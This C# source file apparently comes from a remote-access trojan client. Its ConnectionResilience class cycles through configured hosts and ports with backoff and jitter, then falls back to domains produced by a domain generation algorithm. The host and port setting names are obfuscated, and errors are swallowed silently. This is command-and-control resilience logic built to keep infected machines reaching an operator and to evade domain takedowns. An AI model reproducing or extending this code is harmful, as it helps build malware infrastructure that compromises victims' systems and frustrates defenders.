using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

namespace Client.Connection
{
    public class ConnectionResilience
    {
        private List<string> primaryHosts;
        private List<string> fallbackHosts;
        private List<int> ports;
        private int maxRetries;
        private int currentRetryCount;
        private DateTime lastConnectionAttempt;
        private readonly object lockObject = new object();

        public ConnectionResilience()
        {
            primaryHosts = new List<string>();
            fallbackHosts = new List<string>();
            ports = new List<int>();
            maxRetries = 5;
            currentRetryCount = 0;
            lastConnectionAttempt = DateTime.MinValue;
        }

        public void AddPrimaryHost(string host)
        {
            lock (lockObject)
            {
                if (!primaryHosts.Contains(host))
                    primaryHosts.Add(host);
            }
        }

        public void AddFallbackHost(string host)
        {
            lock (lockObject)
            {
                if (!fallbackHosts.Contains(host))
                    fallbackHosts.Add(host);
            }
        }

        public void AddPort(int port)
        {
            lock (lockObject)
            {
                if (!ports.Contains(port))
                    ports.Add(port);
            }
        }

        public ConnectionTarget GetNextTarget()
        {
            lock (lockObject)
            {
                ApplyBackoffDelay();
                
                List<string> hosts;
                if (currentRetryCount < maxRetries / 2)
                {
                    hosts = primaryHosts;
                }
                else if (currentRetryCount < maxRetries)
                {
                    hosts = fallbackHosts.Count > 0 ? fallbackHosts : primaryHosts;
                }
                else
                {
                    currentRetryCount = 0;
                    hosts = GenerateDGAHosts();
                }

                if (hosts.Count == 0 || ports.Count == 0)
                    return null;

                Random random = new Random();
                string host = hosts[random.Next(hosts.Count)];
                int port = ports[random.Next(ports.Count)];

                currentRetryCount++;
                lastConnectionAttempt = DateTime.UtcNow;

                return new ConnectionTarget { Host = host, Port = port };
            }
        }

        public void ResetRetryCount()
        {
            lock (lockObject)
            {
                currentRetryCount = 0;
            }
        }

        private void ApplyBackoffDelay()
        {
            if (lastConnectionAttempt == DateTime.MinValue)
                return;

            TimeSpan timeSinceLastAttempt = DateTime.UtcNow - lastConnectionAttempt;
            int requiredDelay = CalculateBackoffDelay(currentRetryCount);
            int remainingDelay = requiredDelay - (int)timeSinceLastAttempt.TotalMilliseconds;

            if (remainingDelay > 0)
            {
                Thread.Sleep(remainingDelay);
            }
        }

        private int CalculateBackoffDelay(int attempt)
        {
            int baseDelay = 1000;
            int maxDelay = 60000;
            
            int delay = baseDelay * (int)Math.Pow(2, Math.Min(attempt, 6));
            delay = Math.Min(delay, maxDelay);
            
            Random random = new Random();
            int jitter = random.Next(-delay / 4, delay / 4);
            
            return delay + jitter;
        }

        private List<string> GenerateDGAHosts()
        {
            try
            {
                string[] dgaDomains = DomainGenerator.GetFallbackDomains();
                return dgaDomains.ToList();
            }
            catch
            {
                return primaryHosts;
            }
        }

        public int GetRetryCount()
        {
            lock (lockObject)
            {
                return currentRetryCount;
            }
        }

        public void LoadFromSettings()
        {
            try
            {
                string[] hosts = Settings.Hos_ts.Split(',');
                string[] portStrings = Settings.Por_ts.Split(',');

                foreach (string host in hosts)
                {
                    if (!string.IsNullOrWhiteSpace(host))
                        AddPrimaryHost(host.Trim());
                }

                foreach (string portString in portStrings)
                {
                    if (int.TryParse(portString.Trim(), out int port))
                        AddPort(port);
                }

                string[] dgaDomains = DomainGenerator.GetTodayDomains();
                foreach (string domain in dgaDomains)
                {
                    AddFallbackHost(domain);
                }
            }
            catch { }
        }
    }

    public class ConnectionTarget
    {
        public string Host { get; set; }
        public int Port { get; set; }
    }
}
